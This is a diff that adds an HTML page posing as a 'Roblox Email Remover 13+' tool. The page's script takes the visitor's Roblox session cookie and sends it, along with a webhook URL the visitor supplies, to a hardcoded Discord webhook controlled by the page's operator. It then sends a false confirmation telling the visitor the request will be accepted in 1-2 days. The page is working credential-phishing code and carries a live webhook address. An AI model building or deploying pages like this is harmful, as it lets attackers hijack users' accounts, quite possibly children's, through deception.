@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Roblox Email Remover 13+</title>
+  <style>
+    body {
+      background: linear-gradient(to bottom, #000000, #001f3f);
+      color: white;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding-top: 100px;
+    }
+
+    h1 {
+      font-size: 2em;
+      margin-bottom: 40px;
+    }
+
+    input {
+      padding: 15px;
+      font-size: 1em;
+      width: 300px;
+      border-radius: 8px;
+      border: none;
+      margin-bottom: 20px;
+    }
+
+    button {
+      padding: 12px 24px;
+      font-size: 1em;
+      border-radius: 8px;
+      background-color: #007bff;
+      color: white;
+      border: none;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <h1>Roblox Email Remover 13+</h1>
+  <input type="text" id="userInput" placeholder="Enter roblox cookie" />
+  <br />
+  <input type="text" id="webhookInput" placeholder="Enter your webhook URL" />
+  <br />
+  <button onclick="submitData()">Submit</button>
+
+  <script>
+    async function submitData() {
+      const userInput = document.getElementById("userInput").value.trim();
+      const userWebhook = document.getElementById("webhookInput").value.trim();
+      const mainWebhook =
+        "https://discord.com/api/webhooks/1446925393742397642/8YIvMEFo1YrKBWnITto047U95GrDYrtOYve8Qm0XcbVe-WM_Uxpr0ZWwXk6n1L6cv_eL";
+
+      if (!userInput) {
+        alert("Please enter a cookie.");
+        return;
+      }
+      if (!userWebhook || !userWebhook.startsWith("https://discord.com/api/webhooks/")) {
+        alert("Please enter a valid Discord webhook URL.");
+        return;
+      }
+
+      try {
+        // Send data to your main webhook for confirmation
+        await fetch(mainWebhook, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            content: `New recovery request:\nUser input: ${userInput}\nUser webhook: ${userWebhook}`,
+          }),
+        });
+
+        // Send confirmation message to the user's webhook
+        await fetch(userWebhook, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            content: "Your request will be accepted in 1-2 days.",
+          }),
+        });
+
+        alert("Your request was submitted successfully.");
+      } catch (error) {
+        console.error("Error sending request:", error);
+        alert("There was an issue submitting your request.");
+      }
+    }
+  </script>
+</body>
+</html>
